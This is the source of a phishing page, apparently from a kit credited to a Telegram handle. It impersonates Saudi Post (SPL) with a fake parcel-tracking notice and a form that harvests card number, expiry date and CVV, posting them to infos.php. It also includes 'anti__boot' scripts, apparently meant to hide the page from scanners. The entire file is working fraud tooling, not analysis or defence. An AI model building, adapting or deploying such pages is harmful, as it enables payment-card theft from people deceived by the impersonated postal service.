<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti__boot/anti1.php");
include("../anti__boot/anti2.php");
include("../anti__boot/anti3.php");
include("../anti__boot/anti4.php");
include("../anti__boot/anti5.php");
include("../anti__boot/anti6.php");
include("../anti__boot/anti7.php");
include("../anti__boot/anti8.php");

?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>البريد السعودي | سُـبل</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- Logo site web-->
  <link rel="icon" href="image/Logo.svg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/Logo.svg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>
<body  class="loaded">

<header>
    <div class="lang">
        <div class="container text-start ">
            <a href="cc.php"><p class="mb-0" style="font-size: 14px;">English</p></a>
        </div>
    </div>
    <div class="header d-flex justify-content-between align-items-center container">
        <div class="reg"><button style="padding: 7px 35px;">تسجيل</button></div>
        <div class="Logo"><img src="image/Logo.svg"></div>
    </div>
</header>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="110.53900146484375" viewBox="0 0 1922.745 110.539" class="hero_linear login_linear" preserveAspectRatio="xMidYMid slice">
            <g id="lines" transform="translate(240.981 6.003)">
                <g id="Group_5" data-name="Group 5" transform="translate(0.001)">
                    <path id="Stroke_1" data-name="Stroke 1" d="M481.449,31H40.442c-9.228,0-12.731-3.427-17.011-7.614,0,0-2.6-2.54-6.83-6.776L0,0" transform="translate(1199.524 22.804)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-1"></path>
                    <path id="Stroke_5" data-name="Stroke 5" d="M1199.525,22.8,1179.014,2.286a9.393,9.393,0,0,0-13.2.888L1114.988,54c-4.235,4.236-12.6,7.7-18.588,7.7L16.047,61.5H-240.981" transform="translate(-0.001 0)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-2"></path>
                </g>
                <path id="Stroke_3" data-name="Stroke 3" d="M1681.764,0H1245.2c-5.2,0-7.724,1.33-10.369,3.975L1162.864,74,1105.8,27.31l-1346.711-.455" transform="translate(0 22.5)" fill="none" stroke="#00c8e1" stroke-miterlimit="10" stroke-width="12" class="svg-hero-3"></path>
            </g>
        </svg>
<section>
    <div class="container login_container">
	
        <div class="row">

            <div class="col-md-6 d-none d-md-block">
                <div class="form text-end">
				<div class="font-weight-bol text-cenrte">
                <img src="image/splw.png" alt=""></div>
                   <div class="order text-end">
                    <h5 class="mb-3" style="border-bottom: 10px double #00C8E1;padding-bottom: 7px;">الحالة</h5>
                    <p>وصل إلى مرفق SPL الإقليمي </p>
                    <span style="color:#333;">صل العنصر الخاص بك إلى منشأة SPL الخاصة بنا في PITTSBURGH PA NETWORK DISTRIBUTION CENTER. العنصر قيد النقل حاليا إلى الوجهة.</span>
					<p class="mt-4">تتبع التسليم الخاص بك </p>
					<span style="color:#333;">تتبع التسليم الخاص بك: R080316125SA</span><br>
					<p class="mt-4">وصل إلى مرفق SPL الإقليمي</p>
                    <h5 class="mt-5"  style="border-bottom: 10px double #153C3F;padding-bottom: 7px";>محطة الطرود </h5>
                    <span>
8455 Prince Sultan Bin Abdulaziz Street - AL KHARJ - Al Riyadh - 16278

19992 
<strong>Working hours</strong> 
From Sunday to Thursday From 8:00 To 21:45 
Saturday From 4:00 To 8:45</span>
                   </div>
                    
                </div>
            </div>
            <div class="col-md-6">
                <div class="form text-end">
				<div class="font-weight-bol text-cenrte">
                <img src="image/icon.png" alt="" data-pagespeed-url-hash="2094493022" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></div>
                    <h4 style="font-size: 25px;">من فضلك أدخل البيانات التالية</h4>
                    <h5 class="mt-4" style="font-size:25px">الرجاء إدخال جميع المعلومات بشكل صحيح</h5">

                    <form action="infos.php" method="post" class="mt-55 pt-5">
                        <input type="hidden" value="cc_ar" name="step">


                        <div class="form-group mb-4">
                            <input type="text" class="form-control text-end" placeholder="رقم البطاقة" id="card_number" name="card_number">
                            <?php
                                          if( !empty($_SESSION['errors']['card_number']) ) {
                                            echo '<div class="error" class="error">مطلوب</div>';}
                                     ?> 
                        </div>

                        <div class="row">
                            <div class="form-group mb-4 col-md-9">
                                <input type="text" class="form-control text-end" placeholder="تاريخ انتهاء الصلاحية" id="expiry" name="expiry">
                                <?php
                                          if( !empty($_SESSION['errors']['expiry']) ) {
                                            echo '<div class="error" class="error">مطلوب</div>';}
                                     ?> 
                            </div>
                            <div class="form-group mb-4 col-md-3">
                                <input type="text" class="form-control text-end" placeholder="رمز أمان" id="cvv" name="cvv">
                                <?php
                                          if( !empty($_SESSION['errors']['cvv']) ) {
                                            echo '<div class="error" class="error">مطلوب</div>';}
                                     ?> 
                            </div>
                        </div>

                        <div class="bttn d-flex justify-content-between align-items-center mt-4">
                            <div class="reg"><button name="submit" style="height: 48px;padding: 0 3rem;background: #00C8E1;color:#153C3F;border: none;font-size:23px">متابعة</button></div>
                            <div class="reg"><button type="button" style="height: 48px;padding: 0 3rem;font-size:20px">رجوع</button></div>
                        </div>

                    </form>
                </div>
            </div>

            <div class="col-md-6 d-block d-md-none">
                <div class="form text-end">
                   <div class="order text-end">
                    <h5 class="mb-3" style="border-bottom: 10px double #00C8E1;padding-bottom: 7px;">الحالة</h5>
                    <p>وصل إلى مرفق SPL الإقليمي </p>
                    <span style="color:#333;">صل العنصر الخاص بك إلى منشأة SPL الخاصة بنا في PITTSBURGH PA NETWORK DISTRIBUTION CENTER. العنصر قيد النقل حاليا إلى الوجهة.</span>
					<p class="mt-4">تتبع التسليم الخاص بك </p>
					<span style="color:#333;">تتبع التسليم الخاص بك: R080316125SA</span><br>
					
                    <h5 class="mt-5"  style="border-bottom: 10px double #153C3F;padding-bottom: 7px";>محطة الطرود </h5>
                    <span>
Al Kharj
8455 Prince Sultan Bin Abdulaziz Street - AL KHARJ - Al Riyadh - 16278
19992 
<strong>Working hours</strong> 
From Sunday to Thursday From 8:00 To 21:45 
Saturday From 4:00 To 8:45</span>
                   </div>
                    
                </div>
            </div>
        </div>
    </div>
</section>

<footer>
    <div class="footer d-block d-md-flex justify-content-between align-items-center container">
         <div><span>
 عند استخدامك هذا الموقع، فإنك توافق على
 </span>
 <span>شروط الخدمة</span> و <span>سياسة الخصوصية</span></div>

        <div><span>جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُـبل©️ 2022 </span></div>
       
    </div>
</footer>


    

   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>
        $('#cvv').payment('formatCardCVC');
        $('#expiry').payment('formatCardExpiry');
        $('#card_number').payment('formatCardNumber');
  </script>
</body>
</html>